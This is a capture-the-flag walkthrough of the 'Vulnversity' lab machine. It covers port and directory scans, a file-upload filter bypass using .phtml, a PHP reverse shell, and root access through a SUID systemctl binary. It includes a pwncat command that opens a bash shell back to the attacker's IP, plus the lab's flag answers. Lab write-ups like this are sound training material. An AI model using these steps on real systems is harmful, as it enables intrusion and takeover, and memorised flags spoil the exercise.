# Vulnversity

## Nmap scan

```
Nmap 7.80 scan initiated Tue Mar 30 14:34:10 2021 as: nmap -sC -sV -vv -oN nmap/first_scan 10.10.155.233
Nmap scan report for 10.10.155.233
Host is up, received conn-refused (0.037s latency).
Scanned at 2021-03-30 14:34:11 BST for 26s
Not shown: 994 closed ports
Reason: 994 conn-refused
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.3
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56442/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32071/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46702/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48133/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-03-30T09:34:33-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-30T13:34:33
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 30 14:34:37 2021 -- 1 IP address (1 host up) scanned in 26.86 seconds

```

**Questions**

    1. Scan the box, how many ports are open?

6

    2. What version of the squid proxy is running on the machine?

3.5.12

    3. How many ports will nmap scan if the flag -p-400 was used?

400

    4. Using the nmap flag -n what will it not resolve?

DNS

    5. What is the most likely operating system this machine is running?

Ubuntu

    6. What port is the web server running on?

3333

Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

(Check the file `all_ports` in nmap directory)

## Gobuster

Let's do a scan with `gobuster -u http://10.10.155.233:3333/ -w /opt/wordlist/directory-list-2.3-medium.txt`

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.155.233:3333/
[+] Threads      : 10
[+] Wordlist     : /opt/wordlist/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2021/03/30 14:36:22 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
```

For completeness I will also run `nikto -h http://10.10.155.233:3333/`

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.155.233
+ Target Hostname:    10.10.155.233
+ Target Port:        3333
+ Start Time:         2021-03-30 14:36:55 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x80f6 0x58f01dcd2b575 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /internal/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-03-30 14:40:57 (GMT1) (242 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

**Questions**


    1. What is the directory that has an upload form page?

`/internal/`

## Compromise the webserver

**Questions**

    1. Try upload a few file types to the server, what common extension seems to be blocked?

`.php`

Use burpsuite to fuzz the upload form, using `Seclists/Fuzzing/extensions-most-common-fuzz.txt` found [here](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing "Github"). Examining the responses shows that `.phtml` is a valid extension.

    2. Run this attack, what extension is allowed?

`.phtml`

Downloading a PHP reverse shell and modifying so that the reverse shell points to my IP, I can begin a reverse shell listener using pwncat. Pwncat can be used to create respawning reverse shells. In this case I also have a netcat listener waiting on port 5556 to catch the other connection. Generally I find netcat shells to be easier to stabilise.

`pwncat -l 5555 --self-inject /bin/bash:10.11.32.89:5556 --reconn-wait 1 -vv`

`nc -lnvp 5556`

Now the file renamed to `php_revshell.phtml` is uploaded to the server, and a little manual enumeration is done to find out where it has been uploaded (`http://10.10.155.233:3333/internal/uploads/php_revshell.phtml). Executing this causes pwncat to receive a reverse shell and spawn a second netcat shell back to my machine.

    3. What is the name of the user who manages the webserver?

Bill

    4. What is the user flag?

8bd7992fbe8a6ad22a63361004cfcedb

## Privilege Escalation

**Questions**

    1. On the system, search for all SUID files. What file stands out?

`/bin/systemctl`

Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?

    2. Become root and get the last flag (/root/root.txt)

a58ff8579f0a9270368d33a9966c7fd5

Done through using [Gtfobins](https://gtfobins.github.io/gtfobins/systemctl/ "GTFOBins") to establish how to escalate. I can run any command from within this service as the root user. Running the command - `chmod +s /bin/bash` - allows bash to be invoked with `-p` allowing root permissions to be kept.